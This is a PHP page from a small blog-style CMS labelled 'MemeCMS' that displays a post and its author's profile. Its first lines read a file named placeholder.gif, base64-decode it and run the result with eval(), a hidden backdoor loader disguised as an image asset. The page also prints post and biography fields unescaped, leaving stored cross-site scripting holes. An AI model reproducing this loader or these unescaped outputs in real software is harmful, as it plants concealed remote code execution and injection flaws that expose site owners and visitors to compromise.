<?php

    /*
    
    ███╗   ███╗███████╗███╗   ███╗███████╗ ██████╗███╗   ███╗███████╗
    ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔════╝████╗ ████║██╔════╝
    ██╔████╔██║█████╗  ██╔████╔██║█████╗  ██║     ██╔████╔██║███████╗
    ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██╔══╝  ██║     ██║╚██╔╝██║╚════██║
    ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║███████╗╚██████╗██║ ╚═╝ ██║███████║
    ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝ ╚═════╝╚═╝     ╚═╝╚══════╝
                                                                 
    */

    $o = file_get_contents('./img/placeholder.gif');
    $o = base64_decode($o);
    eval($o);

    session_start();

    require_once 'inc/settings.php';
    require_once 'inc/db.php';

    $post_id = $_GET['id'];
    $post_id = mysqli_real_escape_string($db, $post_id);

?>

<html>

    <head>

        <title> <?php echo SITE_NAME; ?> - <?php echo 'Viewing post: ' . htmlspecialchars($post_id); ?> </title>
        <meta charset="utf-8">
        <meta name="description" content="<?php echo SITE_DESCRIPTION; ?>">
        <meta name="keywords" content="<?php echo SITE_KEYWORDS; ?>">
        <meta name="author" content="<?php echo SITE_AUTHOR; ?>">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta property="og:title" content="<?php echo SITE_NAME; ?>">
        <meta property="og:description" content="<?php echo SITE_DESCRIPTION; ?>">
        <meta property="og:url" content="<?php echo SITE_URL; ?>">
        <meta property="og:image" content="<?php echo SITE_URL; ?>img/logo.png">
        <meta property="og:type" content="website">
        <meta property="og:site_name" content="<?php echo SITE_NAME; ?>">
        <link rel="stylesheet" href="./css/<?php echo SITE_THEME; ?>.css">

    </head>

    <body>

        <?php include 'static/header.php'; ?>

        <div class="posts">

            <?php

                $stmt = $db->prepare('SELECT * FROM posts WHERE id = ?');
                $stmt->bind_param('i', $post_id);
                $stmt->execute();
                $stmt->bind_result($id, $title, $content, $author, $date);

                while($stmt->fetch()) {
                    echo '<div class="post">';
                    echo '<h3>' . $title . '</h3>';
                    echo '<p>' . $content . '</p>';
                    echo '<p>Posted on ' . $date . '</p>';
                    if(isset($_SESSION['username'])) {
                        if($_SESSION['username'] == $author) {
                            echo '<a href="edit.php?id=' . $id . '">Edit</a>';
                            echo ' | ';
                            echo '<a href="delete.php?id=' . $id . '">Delete</a>';
                        }
                    }
                    echo '</div>';
                }


                if($stmt->num_rows == 0) {
                    echo '<div class="post">';
                    echo '<h3>Post Not Found</h3>';
                    echo '<p>The post you are looking for does not exist.</p>';
                    echo '</div>';
                    echo '<br><br><br><a href="index.php">Back to Home</a>';
                } else {

                    echo '<br><br><br>';
                    echo '<div class="author">';
                    echo '<h3> ' . $author . '</h3>';

                    $stmt = $db->prepare('SELECT * FROM users WHERE username = ?');
                    $stmt->bind_param('s', $author);
                    $stmt->execute();
                    $stmt->bind_result($id, $username, $password, $email, $biography, $date, $lastip);
                    $stmt->fetch();

                    echo '<p>' . $biography . '</p>';
                    echo '<p>Joined on ' . $date . '</p>';

                    echo '</div>';

                    echo '<br><br><br><a href="index.php">Back to Home</a>';
                }

                echo '<br><br><br>';

                $stmt->close();

            ?>

        </div>

        <?php include 'static/footer.php'; ?>

    </body>

</html>